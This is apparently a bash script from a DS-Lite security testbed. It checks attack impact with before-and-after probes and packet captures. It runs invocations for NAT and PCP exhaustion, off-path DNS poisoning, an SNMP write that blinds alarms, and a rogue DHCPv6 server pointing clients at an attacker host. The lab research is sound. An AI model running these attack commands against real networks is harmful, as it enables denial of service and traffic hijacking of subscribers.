#!/bin/bash
# verify_impact.sh — EVIDENCE-BASED impact verification of every attack.
#
# For each attack it recreates the situation and proves the IMPACT from the
# actual communication + packets + protocol state, NOT from an HTTP code:
#   1. lab_restore           clean, known-good baseline
#   2. BEFORE probe          do the action that SHOULD work, capture it, record
#                            the evidence (it works) — the control
#   3. ATTACK                run the attack, capture the attack traffic
#   4. AFTER probe           repeat the action (now broken) OR exercise the
#                            attacker's malicious access (now possible), capture
#   5. SKEPTICAL VERDICT      IMPACT CONFIRMED only if BEFORE works AND AFTER is
#                            broken / maliciously-altered, with the protocol
#                            evidence to back it. Otherwise -> NEEDS INVESTIGATION.
#
# Output: testbed/reference_captures/impact/Tn/{before_*.pcap, attack_*.pcap,
#         after_*.pcap, IMPACT.txt}.  Run from the host.
set -u
C="${CONTAINER_NAME:-ds-lite-lab}"
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
REF="$ROOT/testbed/reference_captures/impact"
T=/testbed/attack_tools
CP=2001:db8:cafe; AFTR=$CP::10; VB4=$CP::b41; B42=$CP::b42; ATK6=$CP::13a
GW1=10.0.1.1; GW2=10.0.2.1; SRV=198.51.100.2; SHARED=192.0.2.1
C1=10.0.1.100; C2=10.0.2.100
dx(){ docker exec "$C" "$@"; }
nse(){ docker exec "$C" ip netns exec "$@"; }
AP="$ROOT/testbed/defenses/article_defenses.sh"

cap(){ dx ip netns exec "$1" rm -f "$4" 2>/dev/null
  docker exec -d "$C" ip netns exec "$1" timeout "${5:-12}" tcpdump -i "$2" -n -w "$4" "$3" >/dev/null 2>&1; sleep 0.7; }
pull(){ sleep 2.5; mkdir -p "$(dirname "$2")"; dx cat "$1" > "$2" 2>/dev/null; }
http(){ nse "$1" sh -c "curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://$SRV/ 2>/dev/null"; }
prov(){ nse attacker ip link show eth-isp >/dev/null 2>&1 || dx sh -c '
  ip netns add attacker 2>/dev/null
  ip link add eth-isp-atk type veth peer name atk-br 2>/dev/null
  ip link set eth-isp-atk netns attacker 2>/dev/null
  ip netns exec attacker ip link set eth-isp-atk name eth-isp 2>/dev/null
  ip link set atk-br master br-isp 2>/dev/null; ip link set atk-br up 2>/dev/null
  ip netns exec attacker ip link set lo up 2>/dev/null
  ip netns exec attacker ip link set eth-isp up 2>/dev/null
  ip netns exec attacker ip -6 addr add '"$ATK6"'/64 dev eth-isp 2>/dev/null'
  dx ip link set br-isp type bridge ageing_time 0 2>/dev/null
  dx sh -c 'for p in b41-br b42-br aftr-br atk-br dns-br dhcp6s-br; do bridge link set dev $p flood on mcast_flood on 2>/dev/null; done'; }

lab_restore(){
  dx pkill -9 -f 'nat_exhaustion|nat_hold|tunnel_spoof|reputation_poisoning|pcp_attack|fragment_attack|dhcpv6_hijack|dns_offpath_poison|t5_softwire_inject|t10_peer_crosssub|dns_0x20_forwarder|dns_sink|conntrack -E' 2>/dev/null
  nse aftr pkill -9 -f pcp_server.py 2>/dev/null
  nse b4-1 pkill -9 -f pcp_proxy.py 2>/dev/null; nse b4-2 pkill -9 -f pcp_proxy.py 2>/dev/null; sleep 0.4
  dx ip netns exec aftr env PCP_POOL_SIZE=1024 python3 /testbed/aftr/pcp_server.py >/dev/null 2>&1 &
  dx ip netns exec b4-1 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.1.1 --b4-ip6 $VB4 --aftr-ip6 $AFTR --passthrough-third-party >/dev/null 2>&1 &
  dx ip netns exec b4-2 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.2.1 --b4-ip6 $B42 --aftr-ip6 $AFTR --passthrough-third-party >/dev/null 2>&1 &
  nse aftr pkill -9 -f snmp_agent.py 2>/dev/null; sleep 0.3
  dx ip netns exec aftr python3 -u /testbed/aftr/snmp_agent.py --host 10.99.0.1 --port 161 --community public >/dev/null 2>&1 &
  dx pkill -9 -f 'dhcpv6auth.py server' 2>/dev/null
  dx nft delete table bridge savi 2>/dev/null
  nse aftr ip xfrm state flush 2>/dev/null; nse aftr ip xfrm policy flush 2>/dev/null
  nse b4-1 ip xfrm state flush 2>/dev/null; nse b4-2 ip xfrm state flush 2>/dev/null
  nse aftr sysctl -qw net.netfilter.nf_conntrack_tcp_timeout_syn_recv=60 net.netfilter.nf_conntrack_tcp_timeout_syn_sent=60 net.netfilter.nf_conntrack_udp_timeout=30 >/dev/null 2>&1
  nse aftr conntrack -F >/dev/null 2>&1
  nse aftr nft flush chain ip nat pcp_dnat 2>/dev/null
  nse aftr ip -6 neigh flush dev eth-isp 2>/dev/null
  nse b4-1 sh -c "echo 'aftr.dslite.example.com.' > /run/ds-lite-aftr-name" 2>/dev/null
  nse b4-2 sh -c "echo 'aftr.dslite.example.com.' > /run/ds-lite-aftr-name" 2>/dev/null
  nse dns-server pkill -9 -f dns_sink 2>/dev/null
  nse dns-server ip -6 addr del $CP::5/64 dev eth-isp 2>/dev/null
  # heal the softwire to the stable ::b4N identity
  nse b4-1 ip -6 addr add $VB4/64 dev eth-isp 2>/dev/null
  nse b4-2 ip -6 addr add $B42/64 dev eth-isp 2>/dev/null
  nse b4-1 ip -6 tunnel change ds-lite local $VB4 remote $AFTR 2>/dev/null
  nse b4-2 ip -6 tunnel change ds-lite local $B42 remote $AFTR 2>/dev/null
  sleep 1.5
}

VERDICT=""
hdr(){ printf '\n========== %s ==========\n' "$*"; }
ev(){ printf '  %s\n' "$*"; }
write_impact(){ # <Tn> <before> <attack-evidence> <after> <verdict>
  local d="$REF/$1"; mkdir -p "$d"
  { echo "# $1 — evidence-based impact verification ($(date -u +%FT%TZ))"
    echo
    echo "BEFORE (control — the action works pre-attack):"; echo "  $2"
    echo "ATTACK evidence (what actually happened on the wire):"; echo "  $3"
    echo "AFTER (the situation recreated post-attack):"; echo "  $4"
    echo
    echo "VERDICT: $5"
  } > "$d/IMPACT.txt"
  ev "VERDICT: $5"
}

prov; lab_restore

# ───────────────────────── T1 — NAT exhaustion ─────────────────────────
hdr "T1  NAT exhaustion — victim's NEW connections denied, co-sub unaffected"
b1=$(http client1); b2=$(http client2)
ev "BEFORE: client1 new HTTP=$b1, client2 new HTTP=$b2 (both should be 200)"
cap aftr eth-isp "ip6 dst $AFTR and ip6 proto 4" "$REF/T1/attack_aftr-isp.pcap" 10
nse attacker pkill -9 -f nat_exhaustion 2>/dev/null
prov
nse attacker sh -c "timeout 7 python3 $T/nat/nat_exhaustion.py eth-isp --tunnel --mode fast --src-ip6 $VB4 --aftr-ip6 $AFTR --inner-src-prefix 10.0.1.0/24 --dst-ip4 $SRV --threads 8 --batch 256 >/dev/null 2>&1"
ct=$(nse aftr conntrack -C 2>/dev/null)
pull "$REF/T1/attack_aftr-isp.pcap" "$REF/T1/attack_aftr-isp.pcap"
# AFTER probe: capture client1's NEW SYN attempt + the co-sub control
cap aftr eth-wan "tcp[tcpflags] & tcp-syn != 0" "$REF/T1/after_victim-newconn.pcap" 8
a1=$(http client1); a2=$(http client2)
pull "$REF/T1/after_victim-newconn.pcap" "$REF/T1/after_victim-newconn.pcap"
ev "ATTACK: AFTR conntrack=$ct (cap exhausted by forged ::b41 flood)"
ev "AFTER:  client1 new HTTP=$a1 (victim DENIED), client2 new HTTP=$a2 (co-sub OK)"
if [ "$b1" = 200 ] && [ "$a1" = 000 ] && [ "$a2" = 200 ]; then V="IMPACT CONFIRMED — victim denied, co-subscriber on another B4 unaffected; conntrack=$ct"
else V="NEEDS INVESTIGATION — before c1=$b1 after c1=$a1 c2=$a2 ct=$ct"; fi
write_impact T1 "client1=$b1 client2=$b2" "conntrack exhausted to $ct" "client1=$a1 client2=$a2" "$V"
lab_restore

# ───────────────────────── T7 — PCP pool exhaustion ─────────────────────────
hdr "T7  PCP exhaustion — a co-subscriber's legit MAP is refused (NO_RESOURCES)"
restart_pcp(){ nse aftr pkill -9 -f pcp_server.py 2>/dev/null
  nse b4-1 pkill -9 -f pcp_proxy.py 2>/dev/null; nse b4-2 pkill -9 -f pcp_proxy.py 2>/dev/null; sleep 0.5
  dx ip netns exec aftr env PCP_POOL_SIZE=$1 python3 /testbed/aftr/pcp_server.py >/dev/null 2>&1 &
  dx ip netns exec b4-1 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.1.1 --b4-ip6 $VB4 --aftr-ip6 $AFTR --passthrough-third-party >/dev/null 2>&1 &
  dx ip netns exec b4-2 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.2.1 --b4-ip6 $B42 --aftr-ip6 $AFTR --passthrough-third-party >/dev/null 2>&1 &
  sleep 2; }
restart_pcp 400
bm=$(nse client2 sh -c "timeout 6 python3 $T/infra/pcp_attack.py map --proxy-ip $GW2 --proto 17 --internal-port 9091 2>&1" | grep -qiE 'Mapping created' && echo SUCCESS || echo REFUSED)
ev "BEFORE: co-subscriber (b4-2) PCP MAP = $bm (should be SUCCESS)"
cap aftr eth-isp "udp port 5351" "$REF/T7/attack_pcp.pcap" 12
nse client1 sh -c "timeout 8 python3 $T/infra/pcp_attack.py exhaust --proxy-ip $GW1 --proto 17 --count 600 >/dev/null 2>&1"
am=$(nse client2 sh -c "timeout 6 python3 $T/infra/pcp_attack.py map --proxy-ip $GW2 --proto 17 --internal-port 9092 2>&1" | grep -qiE 'Mapping created' && echo SUCCESS || echo REFUSED)
pull "$REF/T7/attack_pcp.pcap" "$REF/T7/attack_pcp.pcap"
ev "ATTACK: b4-1 flooded 600 MAP requests, draining the shared pool (pcap: udp/5351)"
ev "AFTER:  co-subscriber (b4-2) PCP MAP = $am (should now be REFUSED)"
if [ "$bm" = SUCCESS ] && [ "$am" = REFUSED ]; then V="IMPACT CONFIRMED — pool drained; a co-subscriber on another B4 can no longer get a mapping"
else V="NEEDS INVESTIGATION — before=$bm after=$am"; fi
write_impact T7 "co-sub MAP $bm" "600 MAP flood drained the pool" "co-sub MAP $am" "$V"
restart_pcp 1024; lab_restore

# ───────────────────────── T11 — DNS hijack (off-path) ─────────────────────────
hdr "T11  DNS hijack — the B4 now resolves the AFTR FQDN to the ATTACKER"
# the resolver here is the 0x20 forwarder (so the off-path attack + defence share a path)
nse dns-server ip -6 addr add $CP::5/64 dev eth-isp 2>/dev/null
docker exec -d $C ip netns exec dns-server python3 $T/dns/dns_sink.py $CP::5 53
nse b4-1 sysctl -qw net.core.rmem_max=33554432 2>/dev/null
nse b4-1 pkill -9 -f dns_0x20_forwarder 2>/dev/null
docker exec -d $C ip netns exec b4-1 sh -c "python3 /testbed/defenses/dns_0x20_forwarder.py --listen-ip ::1 --listen-port 5354 --upstream $CP::5 --src-ip $VB4 --src-port 33333 --zerox20 0 --timeout 9 > /tmp/t11fwd.log 2>&1"
sleep 1
# BEFORE: with a normal (real ::2) resolution the FQDN -> real AFTR
bdns=$(nse b4-1 sh -c "dig +short AAAA aftr.dslite.example.com @$CP::2 2>/dev/null | head -1")
ev "BEFORE: AFTR FQDN resolves to $bdns (the real AFTR $AFTR)"
cap b4-1 eth-isp "udp port 33333" "$REF/T11/attack_offpath-flood.pcap" 11
docker exec -d $C ip netns exec b4-1 sh -c "dig AAAA aftr.dslite.example.com @::1 -p 5354 +time=9 +tries=1 >/dev/null 2>&1"
sleep 0.6
nse attacker sh -c "timeout 8 python3 $T/dns/dns_offpath_poison.py --iface eth-isp --upstream $CP::5 --resolver $VB4 --resolver-port 33333 --domain aftr.dslite.example.com --poison-ip $ATK6 --rounds 3 >/dev/null 2>&1"
sleep 3
pull "$REF/T11/attack_offpath-flood.pcap" "$REF/T11/attack_offpath-flood.pcap"
cached=$(dx grep -oE 'cached aftr[^ ]+ -> [0-9a-f:]+' /tmp/t11fwd.log 2>/dev/null | tail -1)
adns=$(nse b4-1 sh -c "dig +short AAAA aftr.dslite.example.com @::1 -p 5354 +time=3 +tries=1 2>/dev/null" | grep -E '^[0-9a-f:]+$' | head -1)
ev "ATTACK: resolver log -> ${cached:-<no cache event>}  (forged-reply flood in pcap)"
ev "AFTER:  B4 now resolves the AFTR FQDN to ${adns:-<none>}  (attacker = $ATK6)"
if echo "$cached" | grep -q "$ATK6" || [ "$adns" = "$ATK6" ]; then V="IMPACT CONFIRMED — resolver cached the attacker address; the B4 would rebuild its softwire to the attacker"
else V="NEEDS INVESTIGATION — off-path race not won this run (forged replies sent; cache=${cached:-none}, dig=${adns:-none})"; fi
write_impact T11 "FQDN -> $bdns (real AFTR)" "resolver ${cached:-no-cache}" "FQDN -> ${adns:-none} (attacker $ATK6)" "$V"
nse b4-1 pkill -9 -f dns_0x20_forwarder 2>/dev/null
nse dns-server pkill -9 -f dns_sink 2>/dev/null
nse dns-server ip -6 addr del $CP::5/64 dev eth-isp 2>/dev/null
lab_restore

# ───────────────────────── T14 — SNMP write (blind the NOC) ─────────────────────────
hdr "T14  SNMP write — alarm threshold raised to max; the alarm can never fire"
OID=1.3.6.1.2.1.240.1.3.1.1
nse mgmt snmpset -v2c -c public -t1 10.99.0.1 $OID u 60 >/dev/null 2>&1
bthr=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $OID 2>/dev/null | grep -oE '[0-9]+$')
ev "BEFORE: alarm threshold = $bthr (a sane operator value)"
cap aftr eth-mgmt "udp port 161" "$REF/T14/attack_snmp-set.pcap" 8
nse mgmt sh -c "timeout 6 python3 $T/infra/snmp_attack.py set --target 10.99.0.1 --oid alarmConnectNumber --value 2147483647 >/dev/null 2>&1"
athr=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $OID 2>/dev/null | grep -oE '[0-9]+$')
pull "$REF/T14/attack_snmp-set.pcap" "$REF/T14/attack_snmp-set.pcap"
ev "ATTACK: SNMP SET alarmConnectNumber over community 'public' (pcap: udp/161)"
ev "AFTER:  NOC reads the threshold = $athr (Integer32 max -> alarm never trips)"
if [ "$bthr" = 60 ] && [ "${athr:-0}" -gt 1000000 ]; then V="IMPACT CONFIRMED — the operator's alarm threshold was silently raised to the max; the NOC is blind to a concurrent exhaustion"
else V="NEEDS INVESTIGATION — before=$bthr after=$athr"; fi
write_impact T14 "threshold=$bthr" "SNMP SET to 2147483647" "threshold=$athr" "$V"
lab_restore

# ───────────────────────── T12 — Rogue AFTR substitution ─────────────────────────
hdr "T12  Rogue AFTR — the B4 adopts the attacker's AFTR name"
bname=$(nse b4-1 cat /run/ds-lite-aftr-name 2>/dev/null | tr -d '[:space:]')
ev "BEFORE: B4 AFTR-Name = $bname (legitimate)"
cap b4-1 eth-isp "udp port 546 or udp port 547" "$REF/T12/attack_rogue-dhcpv6.pcap" 12
nse b4-1 pkill -9 -f 'dhclient.*b4-1' 2>/dev/null; dx pkill -9 -f 'dhcpd -6' 2>/dev/null
docker exec -d $C ip netns exec attacker python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T12 --attacker-ip6 $ATK6 --fake-aftr-fqdn aftr-evil.attacker.example. --fake-aftr-ip6 $ATK6 --auto-trigger-victim b4-1 >/dev/null 2>&1
sleep 6
aname=$(nse b4-1 cat /run/ds-lite-aftr-name 2>/dev/null | tr -d '[:space:]')
pull "$REF/T12/attack_rogue-dhcpv6.pcap" "$REF/T12/attack_rogue-dhcpv6.pcap"
dx pkill -9 -f 'dhcpv6_hijack.py' 2>/dev/null
ev "ATTACK: rogue DHCPv6 server raced the legit ADVERTISE with Option 64 = attacker name (pcap: udp/546-547)"
ev "AFTER:  B4 AFTR-Name = $aname (would rebuild the softwire to the attacker)"
if [ "$bname" = "aftr.dslite.example.com." ] && echo "$aname" | grep -qi evil; then V="IMPACT CONFIRMED — the B4 adopted the attacker's AFTR name; its softwire discovery is hijacked"
else V="NEEDS INVESTIGATION — before='$bname' after='$aname'"; fi
write_impact T12 "AFTR-Name=$bname" "rogue DHCPv6 Option-64 race" "AFTR-Name=$aname" "$V"
lab_restore

hdr "DONE — impact evidence under testbed/reference_captures/impact/"
for t in T1 T7 T11 T14 T12; do printf '  %-4s %s\n' "$t" "$(grep VERDICT "$REF/$t/IMPACT.txt" 2>/dev/null | sed 's/VERDICT: //')"; done
